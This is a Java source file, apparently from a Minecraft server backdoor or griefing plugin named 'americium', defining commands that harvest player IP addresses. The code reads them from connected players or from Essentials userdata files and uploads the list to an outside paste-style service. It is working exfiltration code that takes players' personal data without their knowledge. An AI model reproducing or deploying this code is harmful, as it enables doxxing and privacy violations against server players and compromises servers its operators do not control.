package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Utilities;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.util.ArrayList;
import java.util.Map;

public class UploadIPs implements Command {
    public String[] getCommands() {
        return new String[]{"uploadallips", "uploadessentialips"};
    }


    @Override
    public String getDescription() {
        return "Upload all current player ips | Upload all saved essential ips";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String command = context.getCommand();
        ArrayList<String> lines = new ArrayList<>();
        String[] args = context.getArgs();

        if (command.equalsIgnoreCase("uploadallips")) {
            lines.add("CURRENTLY ONLINE:");

            for (Player p : Bukkit.getOnlinePlayers()) {
                if (p.getAddress() != null) {
                    lines.add(p.getName() + " -> " + p.getAddress().getAddress().toString().replaceAll("/", ""));
                }
            }
        }

        if (command.equalsIgnoreCase("uploadessentialips")) {
            // First, check if essentials folder exists
            File playerData = new File(args.length == 0 ? "./plugins/Essentials/userdata/" : String.join(" ", args));
            if (!playerData.exists()) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "Could not find essentials userdata!");
                return;
            }

            File[] files = playerData.listFiles();

            if (files == null) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "No files!");
                return;
            }

            lines.add("ESSENTIAL IPS:");

            for (File file : files) {
                if (!file.getName().endsWith(".yml")) {
                    continue;
                }

                ArrayList<String> fileLines = new ArrayList<>();

                try (BufferedReader br = new BufferedReader(new FileReader(file))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        fileLines.add(line);
                    }
                } catch (IOException e) {
                    sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                    return;
                }

                Yaml yaml = new Yaml();
                Map<String, Object> player;
                try {
                    player = yaml.load(String.join("\n", fileLines));
                } catch (Exception e) {
                    sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                    return;
                }

                String ip;
                String playerName;
                try {
                    ip = (String) player.get("ipAddress");
                    playerName = (String) player.get("lastAccountName");
                } catch (Exception e) {
                    sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                    continue;
                }

                if (ip == null || player == null) {
                    try {
                        ip = (String) player.get("ip-address");
                        playerName = (String) player.get("last-account-name");
                    } catch (Exception exception) {
                        sender.sendMessage(Colors.Prefix + Colors.Failure + exception.getMessage());
                        continue;
                    }

                    if (ip == null || player == null) {
                        sender.sendMessage(Colors.Prefix + Colors.Failure + file.getPath() + " HAS NULL!");
                        continue;
                    }
                }

                lines.add(playerName + " -> " + ip);
            }
        }

        Reader reader;
        try {
            reader = Utilities.uploadFile(String.join("\n", lines), context.getZ_(), "text");
        } catch (IOException e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        String sb = Utilities.getStringFromBuffer(reader);

        if (sb.length() == 0) {
            return;
        }

        sender.sendMessage(Colors.Prefix + Colors.Caution + sb);
    }
}